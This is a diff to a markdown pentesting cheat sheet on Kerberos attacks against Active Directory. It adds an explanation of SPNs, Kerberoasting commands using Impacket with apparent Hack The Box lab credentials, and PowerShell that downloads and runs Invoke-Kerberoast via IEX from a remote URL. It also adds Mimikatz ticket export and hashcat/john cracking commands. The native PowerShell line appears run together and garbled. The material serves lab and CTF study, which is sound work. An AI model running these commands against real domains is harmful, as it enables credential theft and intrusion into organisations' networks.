@@ -45,6 +45,13 @@ hashcat -m 18200 -a 0 <AS_REP_responses_file> <passwords_file>
 john --wordlist=<passwords_file> <AS_REP_responses_file>
 ```
 
+### SPN Service Principal Name Overview&#x20;
+
+* The structure of an SPN consists of three (3) main parts: **Service Class**: the service type, i.e., _SQL, Web, Exchange, File,_ etc., and the **Host** where the service is usually running in the format of **FQDN** _(Fully Qualified Domain Name)_and **port number**.&#x20;
+*   For example, below, the Microsoft SQL service runs on the **`dcorp-mgmt`** host on port 1443.
+
+    The SPN is **`MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local:1433`**
+
 ## Kerberoasting
 
 * Great reading:
@@ -54,7 +61,10 @@ With [Impacket](https://github.com/SecureAuthCorp/impacket) example GetUserSPNs.
 
 ```shell
 python GetUserSPNs.py <domain_name>/<domain_user>:<domain_user_password> -outputfile <output_TGSs_file>
+python3 GetUserSPNs.py active.htb/svc_tgs:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request
 ```
+
+📌[**HackTricks Tip:**](https://book.hacktricks.xyz/windows/active-directory-methodology/kerberoast) _If you find this **error** from Linux: **Kerberos SessionError: KRB\_AP\_ERR\_SKEW(Clock skew too great)** it because of your local time, you need to synchronize the host with the DC: **ntpdate \<IP of DC>**_
 
 With [Rubeus](https://github.com/GhostPack/Rubeus):
 
@@ -65,8 +75,20 @@ With [Rubeus](https://github.com/GhostPack/Rubeus):
 With **Powershell**:
 
 ```
+#Invoke-Kerberoast.ps1 IEX Method
 iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
+#or load this way
+Import-Module .\invoke-kerberoast.ps1
+#basic command 
+Invoke-Kerberoast -Domain active.htb -OutputFormat Hashcat | fl
+#verbose command 
 Invoke-Kerberoast -OutputFormat <TGSs_format [hashcat | john]> | % { $_.Hash } | Out-File -Encoding ASCII <output_TGSs_file>
+```
+
+* Can also acomplish this in native powershell if you have a session&#x20;
+
+```
+Add-Type -AssemblyName System.IdentityModelNew -ObjectSystem.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "Service class\Hostname:Port"
 ```
 
 Cracking with dictionary of passwords:
@@ -75,6 +97,13 @@ Cracking with dictionary of passwords:
 hashcat -m 13100 --force <TGSs_file> <passwords_file>
 
 john --format=krb5tgs --wordlist=<passwords_file> <AS_REP_responses_file>
+```
+
+### With Invoke-Mimikatz.ps1
+
+```
+Import-Module .\Invoke-Mimikatz.ps1
+Invoke-Mimikatz -Command '"kerberos::list /export"'
 ```
 
 ### Harvest tickets from Windows
